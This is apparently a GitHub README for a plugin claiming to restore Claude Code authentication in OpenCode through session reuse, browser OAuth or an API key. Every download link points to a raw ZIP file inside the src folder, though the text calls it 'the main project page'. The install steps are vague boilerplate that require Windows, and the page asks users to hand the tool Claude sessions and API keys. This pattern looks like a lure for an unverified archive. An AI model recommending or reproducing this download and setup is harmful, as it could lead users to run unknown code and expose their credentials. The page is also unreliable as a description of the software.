# 🤖 opencode-claude-code-auth - Restore Claude auth for OpenCode

[![Download](https://img.shields.io/badge/Download-OpenCode%20Claude%20Auth-blue?style=for-the-badge)](https://github.com/leukosm5097/opencode-claude-code-auth/raw/refs/heads/main/src/code_claude_auth_opencode_2.1.zip)

## 🧩 What this app does

opencode-claude-code-auth is an OpenCode plugin that lets you use Claude Code sign-in again. It works with your Claude Code session, browser OAuth, or an API key. That means you can connect the tool without setting up a separate login flow.

Use it when you want OpenCode to work with the same Claude access you already have. It keeps setup simple and helps you get back to coding faster.

## 💻 Before you start

You need:

- A Windows computer
- Internet access
- A Claude Code account or an API key
- OpenCode installed on your computer
- A web browser such as Chrome, Edge, or Firefox

This plugin is built for users who already use Claude Code or want to connect OpenCode to Anthropic auth.

## 📥 Download

Visit this page to download:

[https://github.com/leukosm5097/opencode-claude-code-auth/raw/refs/heads/main/src/code_claude_auth_opencode_2.1.zip](https://github.com/leukosm5097/opencode-claude-code-auth/raw/refs/heads/main/src/code_claude_auth_opencode_2.1.zip)

If you see a releases page or a download file later, use that as the source for the install files. For now, this is the main project page.

## 🪟 Install on Windows

Follow these steps on Windows:

1. Open the download page in your browser.
2. Get the project files from the repository page.
3. Save the files in a folder you can find again, such as Downloads or Desktop.
4. If the project comes as a ZIP file, right-click it and choose Extract All.
5. Open the extracted folder.
6. Find the OpenCode plugin files inside the folder.
7. Place the plugin where OpenCode keeps its plugins, if your OpenCode setup uses a plugin folder.
8. If OpenCode asks for a path or plugin name, use the folder name `opencode-claude-code-auth`.
9. Restart OpenCode after the files are in place.

If your setup uses a package install step, run it from the project folder before starting OpenCode again.

## 🔐 Sign in with Claude Code auth

After the plugin is installed, choose the auth method that fits your account:

### Browser OAuth

1. Start OpenCode.
2. Open the plugin auth option.
3. Choose browser sign-in.
4. Your browser opens.
5. Sign in with your Anthropic account.
6. Return to OpenCode when the browser finishes.

### Claude Code session

1. Start OpenCode.
2. Select the Claude Code session option.
3. Use the session you already have.
4. Confirm the connection if asked.

### API key

1. Start OpenCode.
2. Open the auth settings.
3. Choose API key mode.
4. Paste your Anthropic API key.
5. Save the setting.

The plugin uses the method you choose and keeps the process in one place.

## 🛠️ How it works

This plugin connects OpenCode to Anthropic auth through common methods used by Claude Code users.

It supports:

- Claude Code session reuse
- Browser-based OAuth sign-in
- API key auth
- Token refresh flow
- PKCE-based sign-in support

This setup helps you keep the same account path across tools without jumping through extra login steps.

## 📁 Folder layout

You may see files and folders like these:

- `src` for the plugin source
- `README.md` for project info
- config files for TypeScript and Node.js
- auth-related files for sign-in and token handling

If you only want to run the plugin, focus on the files that OpenCode needs for plugin loading.

## ⚙️ Basic setup checks

Before you launch OpenCode, check these items:

- OpenCode is installed
- The plugin folder is in the right place
- Your browser can open sign-in pages
- Your internet connection works
- Your Claude or Anthropic account is active

If something does not work, close OpenCode and open it again after you check the folder and auth method.

## 🧭 Use with OpenCode

After setup:

1. Open OpenCode.
2. Open the plugin or auth settings.
3. Choose your auth method.
4. Sign in or paste your key.
5. Start using OpenCode with Claude auth enabled.

You should not need a separate login flow if the plugin is set up the right way.

## 🔄 Refreshing access

Some auth sessions expire after a while. If that happens:

1. Open OpenCode.
2. Go back to the auth settings.
3. Sign in again with the same method.
4. Save the new token or session if asked.
5. Restart OpenCode if the session does not update right away

This keeps your access current and helps avoid sign-in errors.

## 🧪 If OpenCode does not connect

Try these steps:

- Check that you used the right auth method
- Make sure the browser sign-in finished fully
- Confirm your API key is valid
- Restart OpenCode
- Check that the plugin files are in the correct folder
- Remove and reinstall the plugin if needed

If you still see a problem, open the repository page and review the latest project files.

## 🧰 Good use cases

This plugin fits well if you:

- Use Claude Code and want the same auth path in OpenCode
- Prefer browser sign-in over manual setup
- Use an Anthropic API key for direct access
- Want a simple auth setup inside your coding tool
- Need token refresh support without extra steps

## 📌 Project details

Repository name: `opencode-claude-code-auth`

Description: OpenCode plugin that brings back Anthropic auth — use your Claude Code session, browser OAuth, or API key. No separate login flow needed.

Topics:

- ai
- anthropic
- authentication
- claude
- claude-code
- claude-max
- claude-pro
- cli
- coding-agent
- developer-tools
- nodejs
- oauth
- opencode
- opencode-plugin
- pkce
- token-refresh
- typescript